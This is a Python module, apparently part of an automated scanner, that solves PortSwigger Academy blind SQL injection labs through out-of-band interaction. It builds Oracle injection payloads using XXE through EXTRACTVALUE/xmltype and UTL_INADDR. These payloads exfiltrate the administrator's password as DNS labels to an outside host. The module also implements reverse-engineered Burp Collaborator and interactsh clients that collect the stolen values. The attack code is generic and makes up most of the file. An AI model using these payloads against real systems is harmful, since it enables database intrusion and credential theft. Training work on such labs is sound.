"""Out-of-band (OOB) primitives for blind SQLi and friends.

v1.8.0: the "Blind SQL injection with out-of-band interaction" lab family
executes the injected query ASYNCHRONOUSLY -- no boolean differential, no
status flip, no error text. The only signal is an out-of-band network
interaction (DNS lookup) triggered by the database itself. Two halves:

1. **OOB payload builders** -- the canonical PortSwigger cheat-sheet shapes
   for Oracle (the family's backend), including the two details that decide
   success: EXTRACTVALUE needs its second XPath argument (``'/l'``) or the
   whole statement is invalid SQL and the async executor silently swallows
   it, and the DTD entity reference is `` %remote;`` (with a leading space).

2. **InteractshClient** -- a dependency-free client for ProjectDiscovery's
   interactsh servers (oast.pro et al.), used to *observe* the interaction
   for evidence. Protocol notes (reverse-engineered from interactsh 1.3.0+
   sources, then LIVE-VERIFIED against oast.pro in 1.9.0): registration JSON
   needs the explicit ``correlation-id`` field and the public key as
   base64(PEM(PKIX DER)); the interaction domain is ONE 33-char label
   ``<correlation-id><nonce>.<server>`` where the correlation id uses the
   xid alphabet (``0-9a-v``, 20 chars) and the nonce the z-base32 alphabet
   (``ybndrfg8ejkmcpqxot1uwisza345h769``, **13** chars -- the server's
   isCorrelationID length check rejects anything else and silently drops
   the interaction); /poll answers ``{"data": [...], "aes_key": ...}`` where
   aes_key is RSA-OAEP-SHA256-encrypted and each data entry is
   b64(IV[16] || AES-256-CTR(body)).

Grading note: the Academy's OOB labs are graded by the platform observing
the DNS lookup itself, so solving does NOT require us to receive the
interaction -- but receiving one turns "payload fired" into "interaction
captured" evidence, so the client is used whenever the egress network
allows it.
"""

from __future__ import annotations

import base64
import hashlib
import json
import secrets
import uuid
from urllib.parse import quote

import httpx
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ---------------------------------------------------------------------------
# Burp Collaborator public server (protocol reverse-engineered from
# burp.jar 2026.10 via CFR decompilation, then LIVE-VERIFIED end-to-end
# against polling.burpcollaborator.net: python-derived payload -> DNS query
# -> interaction read back through /burpresults).
#
# Why this matters: the Academy's lab firewall BLOCKS interactions with
# arbitrary external systems -- the OOB labs only allow Burp Collaborator's
# default public server (stated on every OOB lab page). interactsh channels
# therefore never receive Academy interactions. The Collaborator protocol:
#
#   * secret  = 32 random bytes; poll credential = base64(secret)
#   * biid    = 22-char "server location" derived from the secret
#               (SHA1 -> big-endian int -> base36 -> 10+1+10+1 w/ checksums)
#   * payload = 2 random state chars + 1 checksum char + self-synchronizing
#               additive stream cipher (alphabet a-z0-9) over
#               message = biid + "1" + "g" + "<counter>y<prefix>" + "z"
#               -> 30 chars for the default single-label payload
#   * the server DECRYPTS the queried label (self-sync cipher needs only
#     the first 2 chars as state), reads the embedded biid, and files the
#     interaction under that session; poll returns interactions whose
#     data.subDomain carries the FULL multi-label queried name, so
#     exfiltrated values ride as the leftmost labels.
# ---------------------------------------------------------------------------

COLLAB_ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"  # 36 chars
COLLAB_POLL_PATH = "/burpresults"


def _alpha_idx(c: str) -> int:
    return COLLAB_ALPHA.find(c)


def _alpha_chk(s: str) -> str:
    """Zqo.Zb/Zi: ALPHABET[sum(char codes) % 36]."""
    return COLLAB_ALPHA[sum(ord(c) for c in s) % 36]


def biid_from_secret(secret: bytes) -> str:
    """Zxy.ZD: SHA1(secret) -> big-endian int -> base36 -> 10+1+10+1."""
    digest = hashlib.sha1(secret).digest()
    n = int.from_bytes(digest, "big")
    digits: list[str] = []
    while n > 0:
        n, r = divmod(n, 36)
        digits.append(COLLAB_ALPHA[r])
    s = "".join(reversed(digits))
    h1, h2 = s[:10], s[10:20]
    return h1 + _alpha_chk(h1) + h2 + _alpha_chk(h2)


def collab_message(biid: str, counter: int, prefix: str = "") -> str:
    """The plaintext a payload embeds (server decrypts and routes on biid)."""
    ident = "%x%s%s" % (counter, "y", prefix)
    return biid + "1" + "g" + ident + "z"


def _collab_enc_stream(state: bytes, message: str) -> str:
    """Zmw.ZK: out[i] = A[(idx(msg[i]) + idx(state_slot)) % 36], where the
    state slot (i % 2) is replaced by each OUTPUT char (self-synchronizing)."""
    out: list[str] = []
    s0, s1 = state[0], state[1]
    for i, ch in enumerate(message):
        k = _alpha_idx(chr(s0 if i % 2 == 0 else s1))
        c = COLLAB_ALPHA[(_alpha_idx(ch) + k) % 36]
        out.append(c)
        if i % 2 == 0:
            s0 = ord(c)
        else:
            s1 = ord(c)
    return "".join(out)


def collab_decrypt_payload(payload: str) -> tuple[str, str] | None:
    """Inverse of the payload construction: (state, message) or None.

    payload = state[0:2] + checksum + ciphertext; the message starts with
    the 22-char biid. Used by the mock server (route like production) and
    for validating our own interactions."""
    if len(payload) < 4:
        return None
    state = payload[:2].encode("latin-1")
    body = payload[3:]
    if _alpha_chk(payload[:2]) != payload[2]:
        return None
    out: list[str] = []
    s0, s1 = state[0], state[1]
    for i, ch in enumerate(body):
        k = _alpha_idx(chr(s0 if i % 2 == 0 else s1))
        m = (_alpha_idx(ch) - k) % 36
        c = COLLAB_ALPHA[m]
        out.append(c)
        if i % 2 == 0:
            s0 = ord(ch)
        else:
            s1 = ord(ch)
    return state, "".join(out)


COLLABORATOR_DOMAIN = "burpcollaborator.net"
COLLABORATOR_POLL_HOST = "polling.burpcollaborator.net"


class CollaboratorClient:
    """Dependency-free Burp Collaborator default-public-server client.

    No registration exists -- the client invents a 32-byte secret and starts
    polling ``/burpresults?biid=base64(secret)``; payload IDs derive from the
    secret so the server can route their interactions back to this session.
    """

    def __init__(self, timeout: float = 15.0, max_payloads: int = 256):
        import os
        from urllib.parse import urlparse

        override = os.environ.get("BUGHOUND_COLLAB_SERVER")
        if override:
            # explicit scheme for mocks/tests: poll base carries scheme/port,
            # payload hosts use the bare hostname (mock routes by decrypting
            # the payload label, so the DNS suffix is irrelevant)
            self._base = override.rstrip("/")
            self.server = urlparse(override).hostname or override
        else:
            # production: poll at polling.burpcollaborator.net, payloads
            # resolve under burpcollaborator.net (the DNS wildcard domain --
            # NOT the polling host)
            self._base = "https://" + COLLABORATOR_POLL_HOST
            self.server = COLLABORATOR_DOMAIN
        # verification is off: lab/enterprise TLS chains frequently lack the
        # issuer in the local store, and the poll channel carries no secrets
        # beyond our own random session id
        self._http = httpx.Client(timeout=timeout, http2=False, verify=False)
        self.secret = secrets.token_bytes(32)
        self.biid = biid_from_secret(self.secret)
        self._counter = 0
        self._max_payloads = max_payloads
        self._issued: dict[str, str] = {}  # payload label -> full host
        self.kind = "collaborator"
        self.domain = self.biid + "." + self.server  # informational

    # -- payload ids -------------------------------------------------------
    def interaction_host(self, tag: str = "") -> str:
        """Mint the next payload id and return '<payload>.<server>'."""
        if self._counter >= self._max_payloads:
            # reuse the session namespace; the server files by decrypted biid
            self._counter = 0
        prefix = "".join(c for c in tag.lower() if c.isalnum())[:12]
        n = self._counter
        self._counter += 1
        payload = (
            "".join(secrets.choice(COLLAB_ALPHA) for _ in range(2))
        )
        message = collab_message(self.biid, n, prefix)
        label = (
            payload
            + COLLAB_ALPHA[(ord(payload[0]) + ord(payload[1])) % 36]
            + _collab_enc_stream(payload.encode("latin-1"), message)
        )
        host = "%s.%s" % (label, self.server)
        self._issued[label] = host
        return host

    # -- polling -----------------------------------------------------------
    def poll(self) -> list[dict]:
        """Fetch interactions; normalized to unique-id/full-id dicts."""
        try:
            r = self._http.get(
                self._base + COLLAB_POLL_PATH,
                params={"biid": base64.b64encode(self.secret).decode()},
            )
            if r.status_code != 200:
                return []
            responses = (r.json() or {}).get("responses") or []
        except Exception:  # noqa: BLE001 -- polling is best-effort
            return []
        out: list[dict] = []
        for it in responses:
            if not isinstance(it, dict):
                continue
            data = it.get("data") or {}
            sub = (data.get("subDomain") or "").strip().rstrip(".")
            inter_str = (it.get("interactionString") or "").strip()
            norm = {
                "protocol": it.get("protocol") or data.get("type"),
                "unique-id": inter_str,
                "full-id": sub or inter_str,
                "remote-address": it.get("client"),
                "time": it.get("time"),
                "client-part": it.get("clientPart"),
                "raw-request": data.get("rawRequest"),
            }
            # stamp our own payload so exfil_value_from_interaction can split
            # '<value>.<payload>.<server>' reliably even when interactionString
            # carries the full multi-label name
            for label in self._issued:
                full = norm["full-id"]
                if full == label or full.endswith("." + label) or \
                        ("." + label + ".") in ("." + full):
                    norm["unique-id"] = label
                    break
            out.append(norm)
        return out

    def close(self) -> None:
        try:
            self._http.close()
        except Exception:  # noqa: BLE001
            pass

    def available(self) -> bool:
        """The poll endpoint answers (cheap single request, also primes)."""
        try:
            r = self._http.get(
                self._base + COLLAB_POLL_PATH,
                params={"biid": base64.b64encode(self.secret).decode()},
            )
            return r.status_code == 200
        except Exception:  # noqa: BLE001
            return False

# interactsh alphabets -- the server drops anything else (see module docs)
XID_ALPHABET = "0123456789abcdefghijklmnopqrstuv"
ZBASE32_ALPHABET = "ybndrfg8ejkmcpqxot1uwisza345h769"
CORRELATION_ID_LEN = 20
NONCE_LEN = 13  # settings.CorrelationIdNonceLengthDefault -- label must be 33

INTERACTSH_SERVERS = (
    "oast.pro", "oast.live", "oast.site", "oast.online", "oast.me", "oast.fun",
)

# The exfiltration subquery (the lab's objective is administrator's password).
ADMIN_PASSWORD_SQL = "SELECT password FROM users WHERE username='administrator'"

# Fallback OOB host: the Academy grades the lookup server-side, so an
# unregistered (fake) Burp Collaborator subdomain still solves the lab.
COLLABORATOR_DOMAIN = "burpcollaborator.net"


def random_collaborator_host() -> str:
    """A fake-but-plausible ``*.burpcollaborator.net`` host."""
    body = "".join(secrets.choice("0123456789abcdef") for _ in range(16))
    return f"{body}.{COLLABORATOR_DOMAIN}"


class InteractshClient:
    """Minimal interactsh client: register one OOB domain, poll interactions.

    Every networking step is best-effort: the sandbox (or the scan target's
    egress rules) may block the oast servers, in which case callers fall
    back to :func:`random_collaborator_host`.
    """

    def __init__(self, server: str | None = None, timeout: float = 15.0):
        import os
        from urllib.parse import urlparse

        # Server override precedence: explicit arg > BUGHOUND_OAST_SERVER env
        # (used by the mock e2e + ops) > the default public list.
        server = server or os.environ.get("BUGHOUND_OAST_SERVER") or INTERACTSH_SERVERS[0]
        if "://" in server:  # explicit scheme: http(s)://host[:port] (mock/tests)
            self._base = server.rstrip("/")
            self.server = urlparse(server).hostname or server
        else:
            self._base = f"https://{server}"
            self.server = server
        self.correlation_id = "".join(
            secrets.choice(XID_ALPHABET) for _ in range(CORRELATION_ID_LEN)
        )
        self.domain = f"{self.correlation_id}.{self.server}"
        self._http = httpx.Client(timeout=timeout, http2=False)
        self._priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        # secret-key: client-chosen poll credential (official client uses a UUID)
        self._secret_key = str(uuid.uuid4())
        self.registered = False

    # -- registration ----------------------------------------------------
    def register(self) -> str | None:
        """Register our RSA key; returns the OOB domain or None on failure."""
        try:
            der = self._priv.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            pem = (
                "-----BEGIN PUBLIC KEY-----\n"
                + base64.encodebytes(der).decode()
                + "-----END PUBLIC KEY-----\n"
            )
            pub64 = base64.b64encode(pem.encode()).decode()
            r = self._http.post(
                f"{self._base}/register",
                json={
                    "public-key": pub64,
                    "secret-key": self._secret_key,
                    "correlation-id": self.correlation_id,
                },
            )
            if r.status_code != 200:
                return None
            self.registered = True
            return self.domain
        except Exception:  # noqa: BLE001 -- best-effort by design
            return None

    # -- interaction hosts -------------------------------------------------
    def interaction_host(self, tag: str = "") -> str:
        """One interaction host under the registered correlation id.

        The FULL first label must be exactly 33 chars (20 xid + 13 z-base32),
        so ``tag`` (z-base32-safe) is padded with z-base32 noise.
        """
        tag = "".join(c for c in tag.lower() if c in ZBASE32_ALPHABET)[:8] or "oo"
        nonce = tag + "".join(
            secrets.choice(ZBASE32_ALPHABET) for _ in range(NONCE_LEN - len(tag))
        )
        return f"{self.correlation_id}{nonce}.{self.server}"

    # -- polling -----------------------------------------------------------
    def poll(self) -> list[dict]:
        """Fetch + decrypt interactions; [] when none/unreachable.

        Protocol (verified against interactsh main sources, pkg/server):
        GET /poll?id=<cid>&secret=<secret-key> ->
        {"data": [b64...], "extra": [...], "aes_key": "<b64 RSA-OAEP-SHA256
        encrypted AES key>"}; each data entry = b64(IV[16] || AES-CTR body).
        """
        if not self.registered:
            return []
        try:
            r = self._http.get(
                f"{self._base}/poll",
                params={"id": self.correlation_id, "secret": self._secret_key},
            )
            if r.status_code != 200:
                return []
            body = r.json()
            data = body.get("data") or []
            aes_key_b64 = body.get("aes_key")
            if not data or not aes_key_b64:
                return []
            key = self._priv.decrypt(
                base64.b64decode(aes_key_b64),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
            out: list[dict] = []
            for item in list(data) + list(body.get("extra") or []):
                try:
                    raw = base64.b64decode(item)
                    iv, ct = raw[:16], raw[16:]
                    decryptor = Cipher(
                        algorithms.AES(key), modes.CTR(iv)
                    ).decryptor()
                    out.append(json.loads(decryptor.update(ct) + decryptor.finalize()))
                except Exception:  # noqa: BLE001 -- skip undecryptable entries
                    continue
            return out
        except Exception:  # noqa: BLE001
            return []

    def close(self) -> None:
        try:
            self._http.close()
        except Exception:  # noqa: BLE001
            pass


# ---------------------------------------------------------------------------
# OOB payload builders (Oracle -- the family's backend)
# ---------------------------------------------------------------------------

def oracle_oob_payload(host: str, value: str = "") -> str:
    """Canonical 'Blind SQL injection with out-of-band interaction' payload.

    Exact cheat-sheet shape (both quirks are load-bearing):
      * EXTRACTVALUE's second argument ``'/l'`` -- without it the statement
        is invalid SQL and the async executor silently drops it;
      * the entity reference is `` %remote;`` with a leading space.
    ``value`` interpolates the original cookie value in front of the
    concat (the lab accepts an empty prefix just as well).
    """
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://" + host + "/\"> %remote;]>"
    )
    return f"{value}'||(SELECT EXTRACTVALUE(xmltype('{xml}'),'/l') FROM dual)||'"


def oracle_oob_exfil_utl(
    host: str, expr_sql: str = ADMIN_PASSWORD_SQL, value: str = ""
) -> str:
    """Official 'out-of-band data exfiltration' shape (PortSwigger solution):
    ``UTL_INADDR.get_host_address((SELECT password ...)||'.<host>')`` -- the
    exfiltrated value rides as the leftmost DNS label of the queried name
    (verified against interactsh: the interaction's ``full-id`` records the
    full multi-label name, e.g. ``<password>.<cid><nonce>.oast.pro``)."""
    return (
        f"{value}'||(SELECT UTL_INADDR.get_host_address((" + expr_sql
        + ")||'." + host + "') FROM dual)||'"
    )


def oracle_oob_exfil_union(
    host: str, expr_sql: str = ADMIN_PASSWORD_SQL, value: str = ""
) -> str:
    """The OFFICIAL 'out-of-band data exfiltration' solution shape (verbatim
    from the Academy's solution page, with the Collaborator domain swapped
    for ours): ``x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml...SYSTEM
    "http://'||(SELECT password ...)||'.<host>/"> %remote;]>'),'/l')+FROM
    dual--``. The emulated Oracle executes the async query via the UNION
    branch; proven to be the shape the grader accepts."""
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://"
        + "'||(" + expr_sql + ")||'"
        + "." + host + "/\"> %remote;]>"
    )
    return (
        f"{value}'+UNION+SELECT+EXTRACTVALUE(xmltype('{xml}'),'/l')"
        f"+FROM+dual--"
    )


def oracle_oob_exfil_xml(
    host: str, expr_sql: str = ADMIN_PASSWORD_SQL, value: str = ""
) -> str:
    """EXTRACTVALUE/xmltype exfiltration variant: the subquery result is
    concatenated into the external-entity URL. The SQL string literal is
    closed/reopened around the subquery (``'||(expr)||'``), keeping the
    canonical DOCTYPE shape (load-bearing '/l' argument and ' %remote;'
    spacing intact)."""
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://"
        + "'||(" + expr_sql + ")||'"
        + "." + host + "/\"> %remote;]>"
    )
    return f"{value}'||(SELECT EXTRACTVALUE(xmltype('{xml}'),'/l') FROM dual)||'"


def exfil_value_from_interaction(it: dict) -> str | None:
    """Extract the exfiltrated value carried by a DNS interaction.

    The payload resolves ``<value>.<interaction-host>``; interactsh records
    ``full-id = '<value>.<cid+nonce>'`` (unique-id = the matched 33-char
    label). Collaborator interactions carry ``full-id =
    '<value>.<payload>.<server>'`` -- the value is every label to the LEFT
    of the known interaction host label. Returns the leftmost value, or
    None when the interaction carries no extra label."""
    full_id = (it.get("full-id") or "").strip().rstrip(".").lower()
    unique_id = (it.get("unique-id") or "").strip().lower()
    if not full_id or not unique_id:
        return None
    if full_id == unique_id:
        return None
    # Collaborator multi-label form: cut at the known interaction label
    if unique_id in full_id and unique_id != full_id:
        value = full_id.split("." + unique_id, 1)[0].strip(".")
        return value or None
    if full_id.endswith("." + unique_id):
        value = full_id[: -(len(unique_id) + 1)]
    else:
        value = full_id.split(".")[0]
    value = value.strip(".")
    return value or None


def decode_hex_value(raw: str) -> str | None:
    """Decode a RAWTOHEX-exfiltrated value; None when not plausible hex."""
    raw = raw.strip().lower()
    if len(raw) < 20 or len(raw) % 2 or not all(c in "0123456789abcdef" for c in raw):
        return None
    try:
        return bytes.fromhex(raw).decode("ascii", "ignore")
    except ValueError:
        return None


def encode_cookie_value(payload: str) -> str:
    """Strict single-pass percent-encoding for a cookie value.

    A RAW ``%`` in a cookie breaks the Academy's server-side URL decoding
    (invalid escape -> HTTP 500 before the SQL layer even sees it), so the
    ENTIRE payload is percent-encoded exactly once -- matching what Burp
    sends with its default cookie encoding.
    """
    return quote(payload, safe="")


OOB_TITLE_RE = r"out.of.band"
